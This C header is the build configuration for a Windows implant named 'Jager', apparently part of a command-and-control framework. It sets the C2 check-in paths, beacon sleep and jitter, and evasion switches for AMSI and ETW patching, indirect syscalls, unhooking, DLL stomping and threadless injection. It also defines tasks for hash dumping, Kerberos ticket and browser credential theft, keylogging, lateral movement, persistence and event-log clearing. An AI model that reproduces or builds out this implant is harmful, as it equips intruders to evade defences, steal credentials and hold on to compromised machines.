#ifndef JAGER_CONFIG_H
#define JAGER_CONFIG_H

#include <windows.h>

// Build-time configuration (populated by polymorphic build pipeline)
// These are placeholder values replaced at compile time via -D flags

#ifndef C2_URL
#define C2_URL "https://127.0.0.1:443"
#endif

#ifndef C2_CHECKIN_PATH
#warning "C2_CHECKIN_PATH not overridden -- default path is a static IOC"
#define C2_CHECKIN_PATH "/api/v1/checkin"
#define C2_CHECKIN_PATH_DEFAULT 1
#endif

#ifndef C2_REGISTER_PATH
#warning "C2_REGISTER_PATH not overridden -- default path is a static IOC"
#define C2_REGISTER_PATH "/api/v1/register"
#endif

#ifndef C2_RESULT_PATH
#warning "C2_RESULT_PATH not overridden -- default path is a static IOC"
#define C2_RESULT_PATH "/api/v1/result"
#endif

#ifndef C2_STAGE_PATH
#warning "C2_STAGE_PATH not overridden -- default path is a static IOC"
#define C2_STAGE_PATH "/api/v1/stage"
#endif

#ifndef C2_TUNNEL_PATH
#define C2_TUNNEL_PATH "/api/v1/tunnel"
#endif

#ifndef SLEEP_SECONDS
#define SLEEP_SECONDS 60
#endif

#ifndef JITTER_PERCENT
#define JITTER_PERCENT 20
#endif

#ifndef MAX_RETRIES
#define MAX_RETRIES 5
#endif

#ifndef KILL_DATE
#define KILL_DATE 0  // Unix timestamp; 0 = no kill date
#endif

#ifndef USER_AGENT
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#endif

// Evasion configuration
#ifndef SLEEP_TECHNIQUE
#define SLEEP_TECHNIQUE 2  // Foliage (was 1/Ekko which is broken)
#endif

#ifndef SYSCALL_METHOD
#define SYSCALL_METHOD 1   // 0=direct, 1=indirect(hells_gate), 2=halos_gate
#endif

#ifndef PATCH_ETW
#define PATCH_ETW 1
#endif

#ifndef PATCH_AMSI
#define PATCH_AMSI 1
#endif

/* AMSI/ETW bypass technique: 0=hwbp, 1=pageguard, 2=patch (byte-patch fallback) */
#ifndef BYPASS_METHOD_HWBP
#define BYPASS_METHOD_HWBP 0
#endif
#ifndef BYPASS_METHOD_PAGEGUARD
#define BYPASS_METHOD_PAGEGUARD 1
#endif
#ifndef BYPASS_METHOD_PATCH
#define BYPASS_METHOD_PATCH 2
#endif
#ifndef AMSI_BYPASS_METHOD
#define AMSI_BYPASS_METHOD BYPASS_METHOD_HWBP
#endif

/* Injection method: 0=classic, 1=threadless, 2=hollow, 3=apc */
#ifndef INJECT_METHOD
#define INJECT_METHOD 1
#endif

#if INJECT_METHOD == 1
#define JAGER_USE_THREADLESS_INJECT 1
#else
#define JAGER_USE_THREADLESS_INJECT 0
#endif

#ifndef UNHOOK_ON_LOAD
#define UNHOOK_ON_LOAD 1
#endif

#ifndef DLL_STOMP_TARGET
#define DLL_STOMP_TARGET "amsi.dll"  /* Default, overridden by build pipeline */
#endif

#ifndef HEAP_ENCRYPT
#define HEAP_ENCRYPT 1
#endif

#ifndef ANTI_ANALYSIS
#define ANTI_ANALYSIS 0
#endif

#ifndef BUILD_ID
#warning "BUILD_ID not set by build pipeline -- using debug default"
#define BUILD_ID "debug-build"
#define BUILD_ID_DEFAULT 1
#endif

#ifdef JAGER_PRODUCTION
#if defined(BUILD_ID_DEFAULT)
#error "BUILD_ID required in production mode"
#endif
#if defined(C2_CHECKIN_PATH_DEFAULT)
#error "C2_CHECKIN_PATH must be overridden in production"
#endif
#if !defined(C2_CHECKIN_PATH_OVERRIDE)
#error "C2_CHECKIN_PATH must be overridden in production"
#endif
#endif

#ifndef BUILD_TOKEN
#warning "BUILD_TOKEN not set by build pipeline"
#define BUILD_TOKEN ""
#endif

#ifndef PIPE_NAME
#define PIPE_NAME "pipe-" BUILD_ID
#endif

#ifndef SERVICE_NAME
#define SERVICE_NAME "svc-" BUILD_ID
#endif

#ifndef MUTEX_NAME
#define MUTEX_NAME "mtx-" BUILD_ID
#endif

#ifndef OBF_KEY
#warning "OBF_KEY not set by build pipeline -- using debug default"
#define OBF_KEY 0x42
#endif

#ifndef C2_URL_LIST
#define C2_URL_LIST ""
#endif

#ifndef DOMAIN_FRONT_CDN
#define DOMAIN_FRONT_CDN ""
#endif

#ifndef DOMAIN_FRONT_HOST
#define DOMAIN_FRONT_HOST ""
#endif

#ifndef SOCKS_AUTH_TOKEN
/* undefined = no SOCKS auth */
#endif

// Task type definitions (must match proto TaskType enum)
#define TASK_SLEEP           1
#define TASK_EXIT            2
#define TASK_SELF_DELETE      3
#define TASK_SHELL           10
#define TASK_POWERSHELL      11
#define TASK_EXECUTE         12
#define TASK_EXECUTE_ASSEMBLY 13
#define TASK_BOF             14
#define TASK_SHELLCODE       15
#define TASK_LS              20
#define TASK_CD              21
#define TASK_PWD             22
#define TASK_CAT             23
#define TASK_UPLOAD          24
#define TASK_DOWNLOAD        25
#define TASK_RM              26
#define TASK_MKDIR           27
#define TASK_CP              28
#define TASK_MV              29
#define TASK_TIMESTOMP       30
#define TASK_PS              40
#define TASK_KILL_PROCESS    41
#define TASK_SPAWN           42
#define TASK_INJECT          43
#define TASK_MIGRATE         44
#define TASK_IFCONFIG        50
#define TASK_NETSTAT         51
#define TASK_PORTSCAN        52
#define TASK_SOCKS_START     53
#define TASK_SOCKS_STOP      54
#define TASK_PORTFWD_ADD     55
#define TASK_PORTFWD_RM      56
#define TASK_TOKEN_STEAL     60
#define TASK_MAKE_TOKEN      61
#define TASK_REVERT_TOKEN    62
#define TASK_TOKEN_RUNAS     67
#define TASK_HASHDUMP        63
#define TASK_KERBEROS_TICKETS 64
#define TASK_DPAPI           65
#define TASK_LOGON_USER      66
#define TASK_SLEEP_MASK      70
#define TASK_UNHOOK          71
#define TASK_PATCH_ETW       72
#define TASK_PATCH_AMSI      73
#define TASK_MODULE_STOMP    74
#define TASK_THREADLESS_INJECT 75
#define TASK_LATERAL_PSEXEC  80
#define TASK_LATERAL_WMI     81
#define TASK_LATERAL_DCOM    82
#define TASK_LATERAL_WINRM   83
#define TASK_LATERAL_SCHTASK 84
#define TASK_PERSIST_REGISTRY 90
#define TASK_PERSIST_SERVICE 91
#define TASK_PERSIST_SCHTASK 92
#define TASK_PERSIST_COM     93
#define TASK_PERSIST_DLL_SIDELOAD 94
#define TASK_SCREENSHOT      100
#define TASK_KEYLOG_START    101
#define TASK_KEYLOG_STOP     102
#define TASK_CLIPBOARD       103
#define TASK_BROWSER_CREDS   104
#define TASK_INLINE_EXECUTE  16
#define TASK_P2P_LISTEN      110
#define TASK_P2P_CONNECT     111
#define TASK_P2P_RELAY       112
#define TASK_DEFENSE_CLEAR_EVENTLOG 113
#define TASK_ARP_SCAN        114
#define TASK_RPORTFWD_ADD    115
#define TASK_RPORTFWD_REMOVE 116

// Buffer sizes
#define MAX_PATH_LEN         520
#define MAX_OUTPUT_SIZE      (1024 * 1024 * 4)   // 4MB max task output
#define MAX_TASK_DATA        (1024 * 1024 * 50)  // 50MB max task payload
#define MAX_BOF_SIZE         (1024 * 1024 * 10)  // 10MB max BOF COFF
#define MAX_TUNNEL_QUEUE     1024
#define INITIAL_BUF_SIZE     4096

// Implant state
typedef struct _IMPLANT_CONFIG {
    char  c2_url[256];
    char  checkin_path[128];
    char  register_path[128];
    char  result_path[128];
    char  tunnel_path[128];
    char  user_agent[256];
    char  implant_id[64];
    DWORD sleep_seconds;
    DWORD jitter_percent;
    DWORD max_retries;
    DWORD kill_date;
    DWORD sleep_technique;
    DWORD syscall_method;
    BOOL  patch_etw;
    BOOL  patch_amsi;
    BOOL  unhook_on_load;
    BOOL  heap_encrypt;
    BOOL  running;
} IMPLANT_CONFIG, *PIMPLANT_CONFIG;

#endif // JAGER_CONFIG_H
